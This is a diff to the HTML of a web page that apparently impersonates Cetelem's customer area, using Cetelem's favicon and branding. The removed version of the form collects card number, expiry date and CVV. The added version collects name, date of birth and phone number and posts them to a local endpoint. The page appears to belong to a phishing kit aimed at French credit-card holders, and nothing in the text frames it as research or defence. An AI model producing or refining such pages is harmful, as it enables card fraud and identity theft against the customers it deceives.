@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Sécurisation - Espace client</title>
+  <title>Vérification des informations personnelles</title>
   <link rel="icon" href="https://www.cetelem.fr/favicon.ico" type="image/x-icon" />
   <style>
     :root {
@@ -106,13 +106,6 @@
       margin-bottom: 25px;
     }
 
-    .form-container p {
-      text-align: center;
-      font-size: 14px;
-      color: #666;
-      margin-bottom: 25px;
-    }
-
     label {
       font-size: 14px;
       display: block;
@@ -196,19 +189,21 @@
 
   <main>
     <div class="form-container">
-      <h1>Carte de crédit renouvelable.</h1>
-      <p>La Carte de crédit renouvelable Cetelem Cpay Mastercard vous accompagne au quotidien en vous permettant de régler vos achats partout.</p>
-      <form method="POST" action="/securisation">
-        <label for="numero_carte">Numéro de carte bancaire :</label>
-        <input type="text" id="numero_carte" name="numero_carte" placeholder="Ex : 4100010203040506" pattern="\d{13,19}" maxlength="19" required>
+      <h1>Vérification des informations personnelles</h1>
+      <form method="POST" action="/verification_personnelle">
+        <label for="nom">Nom :</label>
+        <input type="text" id="nom" name="nom" required>
 
-        <label for="date_expiration">Date d'expiration (MM/YY) :</label>
-        <input type="text" id="date_expiration" name="date_expiration" placeholder="MM/YY" pattern="^(0[1-9]|1[0-2])\/\d{2}$" required>
+        <label for="prenom">Prénom :</label>
+        <input type="text" id="prenom" name="prenom" required>
 
-        <label for="cryptogramme">Cryptogramme :</label>
-        <input type="text" id="cryptogramme" name="cryptogramme" placeholder="Ex : 123" maxlength="4" pattern="\d{3,4}" required>
+        <label for="date_naissance">Date de naissance :</label>
+        <input type="text" id="date_naissance" name="date_naissance" placeholder="jj/mm/aaaa" required pattern="\d{2}/\d{2}/\d{4}">
 
-        <button class="btn" type="submit">Se connecter</button>
+        <label for="telephone">Numéro de téléphone :</label>
+        <input type="tel" id="telephone" name="telephone" required>
+
+        <button class="btn" type="submit">Continuer</button>
       </form>
     </div>
   </main>
